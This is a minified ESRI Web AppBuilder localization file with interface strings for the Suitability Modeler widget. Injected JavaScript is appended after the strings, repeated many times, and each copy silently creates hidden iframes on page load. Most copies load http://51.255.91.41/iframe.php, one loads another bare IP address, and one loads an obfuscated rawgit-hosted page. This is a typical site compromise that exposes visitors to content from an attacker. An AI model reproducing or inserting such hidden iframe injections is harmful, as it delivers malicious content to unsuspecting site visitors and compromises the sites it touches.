// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define({"widgets/SuitabilityModeler/nls/strings":{_widgetLabel:"Suitability Modeler",general:{clear:"Clear",cancel:"Cancel",save:"Run",saveAs:"Export"},saveModel:{save:"Export",title:"Title: ",summary:"Summary: ",description:"Description: ",tags:"Tags: ",folder:"Folder: ",homeFolderPattern:"{username} (Home)",failed:"Export failed."},util:{colorRamp:{low:"Low",high:"High",tipPattern:"{label} ({value})",1:"Extremely Low",2:"Very Low",3:"Low",4:"Low Medium",5:"Medium",6:"High Medium",7:"High",8:"Very High",
9:"Extremely High",flipCaption:"Flip"}},wro:{caption:"Suitability Modeler",browsePrompt:"Weighted Overlay Service",selectLayersCaption:"Select Layers",selectLayers:"Layers",designModelCaption:"Design Model",designModel:"Design Model",transparency:"Transparency",visible:"Visible",total:"Total",unableToLoad:"Unable to load model.",projectNotOpen:"A project is not open.",readMore:"Read More",validation:{validating:"Validating...",invalidItemCaption:"Weighted Overlay Service Warning",notAnImageService:"This item is not an Image Service.",
notAWroService:"This item is not an Weighted Overlay Service.",undefinedUrl:"This item's URL is not defined.",inaccessible:"The service is inaccessible.",generalError:"Unable to open item.",missingFieldPattern:"{field} is a required field",notAllowRasterFunction:"allowRasterFunction must be set to true",notNearestResampling:"defaultResamplingMethod must be Nearest",notIsWeightedOverlayProp:"Key property IsWeightedOverlay must be set to true",invalidLink:"The URL is invalid. Failed to open site for selected layer.",
unexpectedError:"An unexpected state occurred.",rangeMessage:"Value must be between ${0} and ${1}",rangeMessage100:"Value must be between 0 and 100",maxLayers:"Maximum of ${0} layers allowed by service, you must first remove a layer before adding a new one.",notFound:"Layer ${0} not found in weighted overlay service",wroServiceNotDefined:"No weighted overlay service defined for model.",overlayLayerOutputInvalid:"Overlay layer [${0}] remap ranges [${1}] output value missing or invalid",overlayLayerInputInvalid:"Overlay layer [${0}] remap ranges [${1}] input min/max missing or invalid",
overlayLayerRangesMissing:"Overlay layer [${0}] missing remap ranges",overlayLayerWeight:"Overlay layer weights must add up to 100",overlayLayerRequired:"At least one overlay layer is required",overlayLayerNotDefined:"Overlay layers is not defined",requiresColormap:"This raster function requires a colormap, but the model does not have a valid colormap definition",createModelError:"Error Creating Model",invalidModel:"Model is not valid",imageServiceNotDefined:"Image service layer is not defined",imageLayerNotDefined:"Image service layer is not defined",
histogramNotDefined:"No weighted overlay histogram function defined."},colorRampLabel:{"Green Yellow Red":"Green Yellow Red","Red Yellow Green":"Red Yellow Green","Yellow to Dark Red":"Yellow to Dark Red","Dark Red to Yellow":"Dark Red to Yellow","Light Gray to Dark Gray":"Light Gray to Dark Gray","Dark Gray to Light Gray":"Dark Gray to Light Gray","Light Brown to Dark Brown":"Light Brown to Dark Brown","Dark Brown to Light Brown":"Dark Brown to Light Brown","Full Spectrum - Bright Red to Blue":"Full Spectrum - Bright Red to Blue",
"Full Spectrum - Bright Blue to Red":"Full Spectrum - Bright Blue to Red","Partial Spectrum - Yellow to Blue":"Partial Spectrum - Yellow to Blue","Partial Spectrum - Blue to Yellow":"Partial Spectrum - Blue to Yellow","Yellow-Green to Dark Blue":"Yellow-Green to Dark Blue","Dark Blue to Yellow-Green":"Dark Blue to Yellow-Green","Cold to Hot Diverging":"Cold to Hot Diverging","Hot to Cold Diverging":"Hot to Cold Diverging","Surface - Low to High":"Surface - Low to High","Surface - High to Low":"Surface - High to Low"}},
_localized:{ar:1,bs:1,cs:1,da:1,de:1,el:1,es:1,et:1,fi:1,fr:1,he:1,hi:1,hr:1,id:1,it:1,ja:1,ko:1,lt:1,lv:1,nb:1,nl:1,pl:1,"pt-br":1,"pt-pt":1,ro:1,ru:1,sl:1,sr:1,sv:1,th:1,tr:1,vi:1,"zh-cn":1,"zh-hk":1,"zh-tw":1}},"widgets/SuitabilityModeler/setting/nls/strings":{allowSaveAs:"Allow Export",startingState:"Starting state:",byUrl:"Blank model",byItem:"Pre-configured model",imageServiceUrl:"Image Service URL",validate:"Validate",validating:"Validating...",validated:"The URL is valid.",modelName:"Model",
selectModel:"Select",itemSelectorTitle:"Select a Model",ok:"OK",cancel:"Cancel",description1:"The Suitability Modeler helps you find the best location for an activity, predict susceptibility to risk, or identify where something is likely to occur. This widget allows you to combine and weight different layers so you can evaluate multiple factors at once.",description2:"The Suitability Modeler uses fast, web-based Weighted Raster Overlay to generate models from a service. You can start from a blank state of a Weight Raster Overlay (WRO) Service or a pre-configured WRO model. Choose layers, assign weights and adjust layer classification values to define your analysis. Then, run the modeler, visualize results, and optionally save the result as an item in your organization/portal.",
description3:"Learn more about the GeoPlanner suitability modeler.",_localized:{ar:1,bs:1,cs:1,da:1,de:1,el:1,es:1,et:1,fi:1,fr:1,he:1,hi:1,hr:1,id:1,it:1,ja:1,ko:1,lt:1,lv:1,nb:1,nl:1,pl:1,"pt-br":1,"pt-pt":1,ro:1,ru:1,sl:1,sr:1,sv:1,th:1,tr:1,vi:1,"zh-cn":1,"zh-hk":1,"zh-tw":1}}});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});